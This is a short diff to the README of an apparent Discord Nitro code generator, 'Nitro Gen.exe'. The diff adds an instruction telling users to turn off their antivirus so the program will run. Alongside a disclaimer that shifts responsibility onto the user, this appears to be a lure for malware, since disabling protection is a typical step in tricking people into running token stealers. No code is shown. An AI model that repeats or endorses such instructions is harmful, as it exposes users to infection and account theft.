@@ -45,6 +45,7 @@ By using **THIS SCRIPT**, you agree that you **hold responsibility** and account
 
 # How to use
 ```python
+ - TURN OFF ANTI VIRUS OR IT WILL NOT WORK.
  - Create a WebHook on your Discord Server. I recommend creating a New server!
  - Open Nitro Gen.exe and enter your Webhook
  - Wait a while to find codes. then look in your discord server for codes!
